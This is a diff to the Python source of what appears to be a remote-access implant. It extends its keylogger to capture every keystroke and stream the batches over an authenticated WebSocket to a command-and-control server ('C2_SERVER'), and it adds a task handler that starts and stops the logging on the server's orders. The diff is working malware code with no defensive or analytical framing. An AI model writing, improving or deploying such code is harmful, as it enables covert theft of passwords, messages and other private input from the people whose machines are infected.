@@ -1041,40 +1041,101 @@ class Keylogger:
         self.log = ""
         self.listener = None
         self.running = False
+        self.ws_client = None
+        self.lock = threading.Lock()
+        self.batch_size = 50
+        self.batch_interval = 5  # seconds
+        self._last_send_time = 0
+        self.logger = logging.getLogger('keylogger')
+        if not self.logger.hasHandlers():
+            handler = logging.StreamHandler()
+            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            handler.setFormatter(formatter)
+            self.logger.addHandler(handler)
+            self.logger.setLevel(logging.DEBUG)
 
     def start(self):
         if self.running:
+            self.logger.debug("Keylogger start called but already running")
             return {"status": "error", "message": "Keylogger already running"}
         
+        self.logger.debug("Keylogger start called")
         self.running = True
+        self.log = ""
+        self._last_send_time = time.time()
         self.listener = keyboard.Listener(on_press=self._on_key_press)
         self.listener.start()
+        self.logger.debug("Keylogger started and listener started")
+        self._start_sending_thread()
         return {"status": "success", "message": "Keylogger started"}
+
+    def _start_sending_thread(self):
+        def send_loop():
+            self.logger.debug("Keylogger sending thread started")
+            while self.running:
+                time.sleep(self.batch_interval)
+                self._send_logs()
+        threading.Thread(target=send_loop, daemon=True).start()
+
+    def _on_key_press(self, key):
+        self.logger.debug(f"Key pressed: {key}")
+        try:
+            char = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                char = " "
+            elif key == key.enter:
+                char = "\n"
+            else:
+                char = f"[{key}]"
+        with self.lock:
+            self.log += char
+        if len(self.log) >= self.batch_size or (time.time() - self._last_send_time) >= self.batch_interval:
+            self._send_logs()
+
+    def _send_logs(self):
+        if not self.ws_client or not self.running:
+            self.logger.debug("Keylogger _send_logs: ws_client missing or not running")
+            return
+        with self.lock:
+            if not self.log:
+                self.logger.debug("Keylogger _send_logs: no logs to send")
+                return
+            data_to_send = self.log
+            self.log = ""
+            self._last_send_time = time.time()
+        try:
+            self.logger.debug(f"Keylogger _send_logs: sending {len(data_to_send)} chars")
+            if self.ws_client and self.ws_client.socket:
+                self.logger.debug(f"Emitting keylogger_data event with data: agent_id={self.ws_client.agent_id}, keys_length={len(data_to_send)}")
+                self.ws_client.socket.emit('keylogger_data', {
+                    'agent_id': self.ws_client.agent_id,
+                    'keys': data_to_send,
+                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                }, namespace='/keylogger')
+                self.logger.debug("Keylogger _send_logs: sent successfully")
+            else:
+                self.logger.debug("Keylogger _send_logs: ws_client or socket not available")
+        except Exception as e:
+            self.logger.error(f"Failed to send keylogger data: {str(e)}")
 
     def stop(self):
         if not self.running:
+            self.logger.debug("Keylogger stop called but not running")
             return {"status": "error", "message": "Keylogger not running"}
         
         self.running = False
         if self.listener:
             self.listener.stop()
+        self._send_logs()
+        self.logger.debug("Keylogger stopped")
         return {"status": "success", "message": "Keylogger stopped"}
 
     def get_logs(self):
-        logs = self.log
-        self.log = ""
+        with self.lock:
+            logs = self.log
+            self.log = ""
         return logs
-
-    def _on_key_press(self, key):
-        try:
-            self.log += str(key.char)
-        except AttributeError:
-            if key == key.space:
-                self.log += " "
-            elif key == key.enter:
-                self.log += "\n"
-            else:
-                self.log += f"[{key}]"
 
 
 # ======================
@@ -1196,7 +1257,7 @@ class WebSocketClient:
 
             @self.socket.on('connect', namespace='/terminal')
             def on_connect():
-                self.logger.info("WebSocket connected, authenticating...")
+                self.logger.info("WebSocket connected on /terminal, authenticating...")
                 try:
                     auth_data = {
                         'agent_id': self.agent_id,
@@ -1212,6 +1273,21 @@ class WebSocketClient:
                 except Exception as e:
                     self.logger.error(f"Authentication failed: {str(e)}")
 
+            @self.socket.on('connect', namespace='/keylogger')
+            def on_keylogger_connect():
+                self.logger.info("WebSocket connected on /keylogger, authenticating...")
+                try:
+                    auth_data = {
+                        'agent_id': self.agent_id,
+                        'auth_token': self.crypto.encrypt({
+                            'agent_id': self.agent_id,
+                            'timestamp': int(time.time())
+                        })
+                    }
+                    self.socket.emit('agent_connect', auth_data, namespace='/keylogger')
+                except Exception as e:
+                    self.logger.error(f"Authentication failed on /keylogger: {str(e)}")
+
             @self.socket.on('disconnect', namespace='/terminal')
             def on_disconnect():
                 self.logger.warning("WebSocket disconnected")
@@ -1225,7 +1301,7 @@ class WebSocketClient:
                     'X-Agent-ID': self.agent_id
                 },
                 transports=['websocket'],
-                namespaces=['/terminal']
+                namespaces=['/terminal', '/keylogger']
             )
 
             if not connected_event.wait(connection_timeout):
@@ -1853,12 +1929,28 @@ class Agent:
                 else:
                     return self.socks_proxy.stop()
             
-            elif task_type == "keylogger":
-                if task.get("action") == "start":
+            if task_type == "keylogger":
+                action = task.get("action") or task.get("data", {}).get("action")
+                if action == "start":
+                    if not self.ws_client or not self.ws_client.connected:
+                        self.ws_client = WebSocketClient(
+                            self.agent_id,
+                            self.crypto,
+                            self.config.C2_SERVER,
+                            self.config
+                        )
+                    if self.ws_client.connect():
+                        self.keylogger.ws_client = self.ws_client
+                    else:
+                        return {"status": "error", "message": "Failed to connect WebSocket for keylogger"}
                     return self.keylogger.start()
-                else:
+                elif action == "stop":
                     result = self.keylogger.get_logs()
                     self.keylogger.stop()
+                    if self.ws_client and self.ws_client.connected:
+                        self.ws_client.disconnect()
+                    self.keylogger.ws_client = None
+                    self.ws_client = None
                     return {"logs": result}
             
             else:
